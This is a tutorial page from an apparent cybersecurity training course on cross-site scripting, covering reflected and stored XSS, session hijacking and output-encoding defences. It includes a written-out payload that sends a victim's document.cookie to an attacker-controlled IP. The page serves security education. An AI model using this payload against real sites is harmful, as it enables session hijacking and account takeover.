## WEB

# Cross site scripting

<div align="center">
 <video src="https://github.com/alphyos/CyberStart-2023/assets/116646389/9f1402b2-b229-4163-b1ca-36abf864d7cb" width="800" />
</div>

## XSS (Cross Site Scripting)

Here we cover the concept of cross site scripting, or as it is more
broadly known 'XSS'. It is very actively exploited as it can be a tough
vulnerability for website owners to stay on top of, and can affect many
areas of a web app. It's often caused by having poor filtering of user
provided data and allowing an attacker to get JavaScript code to execute
 in a user's browser - often providing access to their account, or
redirecting them to malicious code. It can seem like an ongoing game of
site owners cleaning XSS vulnerable output and an attacker finding
another vulnerable area, or a more creative workaround to get it working
 again.

An example vulnerable point may be a name which is part of a querystring within a URL, eg `https://example.com?name=Bob` but rather than provide "Bob" you might be able to provide malicious code instead, so the URL is `https://example.com?name=<script>alert(1);</script>`. If visiting this URL you see an alert message pop up with `1`
 as the message you can be pretty sure you found a vulnerable area. This
 is a basic example and tools exist to try 1000's of different
variations across a site to find obscure vulnerable areas.

## Session hijacking

With proof of a vulnerability and if the site has a [session cookie](https://play.cyberstart.com/field-manual/8f9e3c44-d7eb-11eb-98f3-0242ac140009),
 an attacker could craft a link to provide to a victim somehow (perhaps
via email or messenger), which includes injected code to steal their
session cookie value; and so will be able to 'hijack' their session. To
demonstrate this, if the JavaScript portion of the URL instead contained
 say `<script>document.location='https://1.268.3.5?data='%2bdocument.cookie</script>`
 and the attacker was listening for incoming connections on that IP,
they'd just have to wait for incoming cookie data when the victim
clicked the link. As soon as the data comes in, they can copy the
session cookie name & key value into their own browser to then have
the *same session* as the victim, effectively joining them in their session and having access to their account, personal information and more!

## Stored XSS

The above is an example of **Reflected XSS** where the server *reflects* an attack back to the user via some provided data. Another common type of XSS is **Stored XSS**.
 This is where the attacker is able to get the web app to store their
attack in a persistent store, such as a database. There's then no need
to try to send links to anyone; whoever visits the site will have it
triggered for them. One vulnerability could lead to thousands of other
users on the site being compromised.

These attacks often succeed as user's typically trust the websites
they're visiting, and don't consider that an attacker's malicious code
may be delivered to them from the site.

## Convincing redirects

Aside from joining the victim in their session to have joint access
to their account, the attacker may instead provide a link which instead
of stealing their cookie information, shows a convincing warning
message. Having an alert show on a site the victim trusts may give them
the confidence that the site is advising and helping them, and proceed
to download malware or other malicious code. If successful, the attacker
 can then use this to get a foothold on their computer.

> Browsers have gotten better at detecting XSS vulnerabilities as it's
> such a huge problem. However, website owners can protect themselves by
> running security tools to check for XSS vulnerabilities and of course
> manually confirming user provided code doesn't have XSS issues when
> output on a page.

## Cleaning user data to prevent XSS

Filtering user data when initially provided is a common approach to
preventing XSS, but it can be tricky: we may accidentally remove
characters that are valid, for example an apostrophe in the name *Tom O'Brien*, or the requirements for the sanitised data may change after the data has already been collected.

Rather than trying to filter user data on input, current best
practices instead suggests accepting user data largely as-is, knowing
that it is untrustworthy, and cleaning user data when output to the
page. This allows for much more focused cleaning depending on the
context, or where the user data is being used.

A common question is "How do you clean XSS on output?". Many
frameworks offer simple cleaning functions, but it's possible to protect
 yourself if your framework does not offer this or you don't use a
framework. While not bulletproof for all unicode character sets (e.g.
UTF-16 rather than the more common UTF-8), there are 5 contexts you
should clean within - HTML, Attribute, JavaScript, CSS and URL, each
with their own requirements. See the [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for more info.

<div align="center">

[← Previous: 2.10 - Command injection](CommandInjection2.10.md) | [Next: 2.12 - Filters in web applications →](FiltersInWebApplications2.12.md)
:-|-:
